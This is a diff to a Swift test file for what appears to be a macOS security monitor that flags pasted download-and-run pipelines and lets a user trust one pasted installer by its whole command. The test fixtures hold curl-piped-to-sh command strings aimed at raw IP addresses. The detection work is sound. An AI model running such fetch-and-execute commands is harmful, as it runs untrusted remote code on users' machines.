@@ -65,14 +65,15 @@ final class PipelineCorrelatorTests: XCTestCase {
         return report
     }
 
-    private func curl(_ url: String, microseconds: UInt64 = 1_000) -> ProcessMetrics {
-        process(500, "curl", "/usr/bin/curl", command: "curl -fsSL \(url)", parent: 302, group: 500,
+    /// The first process of a pipeline leads its process group, so the group is its pid.
+    private func curl(_ url: String, pid: Int32 = 500, microseconds: UInt64 = 1_000) -> ProcessMetrics {
+        process(pid, "curl", "/usr/bin/curl", command: "curl -fsSL \(url)", parent: 302, group: pid,
                 startedMicroseconds: microseconds)
     }
 
-    private func runner(_ command: String, pid: Int32 = 501, microseconds: UInt64 = 3_000) -> ProcessMetrics {
+    private func runner(_ command: String, pid: Int32 = 501, group: Int32 = 500, microseconds: UInt64 = 3_000) -> ProcessMetrics {
         let name = String(command.split(separator: " ")[0])
-        return process(pid, name, "/bin/\(name)", command: command, parent: 302, group: 500, startedMicroseconds: microseconds)
+        return process(pid, name, "/bin/\(name)", command: command, parent: 302, group: group, startedMicroseconds: microseconds)
     }
 
     func testAPastedDownloadAndRunIsCaught() async throws {
@@ -113,5 +114,34 @@ final class PipelineCorrelatorTests: XCTestCase {
             threadCount: 1, isSystemProcess: true, sampledAt: now, session: later.session)
         let apart = await paste([curl("http://45.9.148.21/install"), laterStart])
         XCTAssertTrue(apart.findings.isEmpty, "six seconds apart")
+    }
+
+    /// The runner's own command line is a bare `sh`, so trusting a pasted installer must key on the
+    /// whole pipeline: keyed on `sh`, it would hide every later pasted download through that shell.
+    func testTrustingAPastedInstallerTrustsThatPipelineNotEveryShell() async throws {
+        let engine = SentinelEngine(live: .rulesOnly)
+        _ = await engine.ingest(processes: tab, uiVisible: true, now: now)
+        let installer = "http://45.9.148.21/install"
+        let pasted = await engine.ingest(processes: tab + [curl(installer), runner("sh")], uiVisible: true,
+                                         now: now.addingTimeInterval(1))
+        let finding = try XCTUnwrap(pasted.findings.first { $0.identity.pid == 501 })
+        XCTAssertEqual(finding.trustOffer?.anchor, .command(sha256: SentinelTrust.digest("curl -fsSL \(installer) | sh")))
+
+        let trusted = await engine.trust(findingID: finding.id)
+        let entry = try XCTUnwrap(trusted)
+        XCTAssertEqual(entry.anchor, .command(sha256: SentinelTrust.digest("curl -fsSL \(installer) | sh")),
+                       "the whole pasted command is what is trusted")
+        XCTAssertNotEqual(entry.anchor, .command(sha256: SentinelTrust.digest("sh")), "a bare shell identifies nothing")
+
+        // Another download through the same shell is not the command that was trusted.
+        let other = [curl("http://45.9.148.99/x", pid: 510), runner("sh", pid: 511, group: 510)]
+        let second = await engine.ingest(processes: tab + other, uiVisible: true, now: now.addingTimeInterval(2))
+        XCTAssertNotNil(second.findings.first { $0.identity.pid == 511 }, "a different pasted download is still news")
+
+        // The same command again, in new processes, is quiet.
+        let again = [curl(installer, pid: 520), runner("sh", pid: 521, group: 520)]
+        let quiet = await engine.ingest(processes: tab + again, uiVisible: true, now: now.addingTimeInterval(3))
+        XCTAssertNil(quiet.findings.first { $0.identity.pid == 521 }, "the trusted pipeline stays quiet")
+        XCTAssertEqual(quiet.trusted.count, 1)
     }
 }
